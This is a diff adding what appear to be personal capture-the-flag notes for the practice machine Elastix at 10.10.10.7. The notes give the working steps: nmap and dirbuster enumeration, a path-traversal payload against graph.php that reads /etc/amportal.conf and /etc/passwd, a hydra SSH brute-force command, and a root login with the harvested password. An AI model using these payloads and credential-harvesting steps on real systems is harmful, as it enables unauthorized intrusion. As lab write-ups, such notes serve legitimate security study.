@@ -1,0 +1,55 @@
+nmap -sC -sV -oA nmap 10.10.10.7
+port 22 for ssh
+port 25 for smtp (mail)
+port 80 and 443 for apache http
+port 10000 for webmin httpd
+port 3306 for mySQL
+
+SOLUTION #1 : LFI + password
+Let's go on its webpage 10.10.10.7
+Elastix :  an unified communications server software that brings together IP PBX, 
+email, IM, faxing and collaboration functionality.
+Copyright : running a date function, still 2019
+Source Page : Nothing special on sight
+
+Let's run dirbuster (find hidden directories and files)
+We found /admin & /configs
+/configs not conclusive
+/admin no password :(
+trying wrong ids, we get redirect to https://10.10.10.7/admin/config.php
+Its says FreePBX 2.8.1.4, lets check for FreePBX 2.8.1.4 changelog
+
+Let's check for /help, lets look for backup instructions, we see a backup dating back
+from 2010
+Lets go back to the front page and download the logo
+curl -k https://10.10.10.7/themes/elastixneo/images/elastix_logo_mini.png -o elastix.png
+-k to avoid certificates
+run exiftool elastix.png to see if any metadata would say 2010,2011,2012... Not really
+
+We know we run against elastix and an old version of it 2010
+Lets run searchsploit elastix
+Elastix 2.2.0 - 'graph.php' Local File Inclusion | exploits/php/webapps/37637.pl
+searchsploit -x exploits/php/webapps/37637.pl
+/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&m
+odule=Accounts&action
+Lets go see page source, we see pids and passwords lets save all these
+vi pw 
+
+Another good path to check is /etc/passwd 
+/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&m
+odule=Accounts&action
+vi users
+We want to do a ssh bruteforce, so lets grab every users that has a valid login
+Glancing at the last line, I /bin/bash that's what I am looking for.
+run g/nologin/d to erase /nologin routes from the file
+Lets make our list of users nice and neat
+
+Lets run hydra 
+hydra -L users -P pw ssh://10.10.10.7
+No catch weird ..., it may have something blocking us.
+Lets try it manually ssh root@10.10.10.7 
+password : jEhdIekWmdjE
+Ouhhh it worked, we are root now ;)
+
+
+
